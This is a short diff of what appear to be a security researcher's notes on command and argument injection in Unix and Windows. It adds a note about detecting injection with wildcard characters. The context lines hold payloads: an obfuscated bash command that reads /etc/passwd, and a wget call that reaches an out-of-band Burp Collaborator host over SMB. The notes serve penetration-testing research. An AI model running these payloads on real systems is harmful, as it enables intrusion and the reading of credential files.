@@ -28,6 +28,7 @@ X=$'cat\x20/etc/passwd'&&$X
 		wget http://wp.pl -O smb://fdwi7155tpq9htil8kigfkgfh6nwbl.burpcollaborator.net/share/public/file.txt
 		
 	- nix: also, consider injections into sh expressions (?)
+	- nix: how about response-based detection of argument injection by injecting wildcard chars (?*[])?
 	- nix + win envirables inspirations from CONFidence
 
 	- win: the windows argument injection pattern /c "command" I "figured out" after reading the recently released reference
@@ -57,4 +58,3 @@ C:\Users\win\Desktop\testy>dir
 06/17/2018  12:35 AM                 0 'test
                1 File(s)              0 bytes
                2 Dir(s)   6,749,995,008 bytes free
-
